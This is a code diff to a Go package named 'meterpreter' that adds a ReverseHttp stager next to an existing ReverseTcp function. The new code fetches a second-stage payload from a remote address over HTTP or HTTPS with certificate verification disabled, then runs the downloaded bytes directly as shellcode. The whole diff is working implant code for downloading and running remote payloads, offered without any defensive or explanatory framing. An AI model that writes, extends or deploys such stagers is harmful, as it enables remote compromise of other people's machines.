@@ -1,9 +1,12 @@
 package meterpreter
 
 import (
+	"crypto/tls"
 	"encoding/binary"
+	"io/ioutil"
 	"math/rand"
 	"net"
+	"net/http"
 	"runtime"
 	"time"
 
@@ -98,6 +101,33 @@ func ReverseTcp(address string) (bool, error) {
 	}
 
 	shell.ExecShellcode(stage2Buf)
+
+	return true, nil
+}
+
+func ReverseHttp(connType, address string) (bool, error) {
+	var (
+		resp *http.Response
+		err  error
+	)
+	url := connType + "://" + address + "/" + GenerateURIChecksum(12)
+	if connType == "https" {
+		transport := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client := &http.Client{Transport: transport}
+		resp, err = client.Get(url)
+	} else {
+		resp, err = http.Get(url)
+	}
+	if err != nil {
+		return false, err
+	}
+
+	defer resp.Body.Close()
+
+	stage2buf, _ := ioutil.ReadAll(resp.Body)
+	shell.ExecShellcode(stage2buf)
 
 	return true, nil
 }
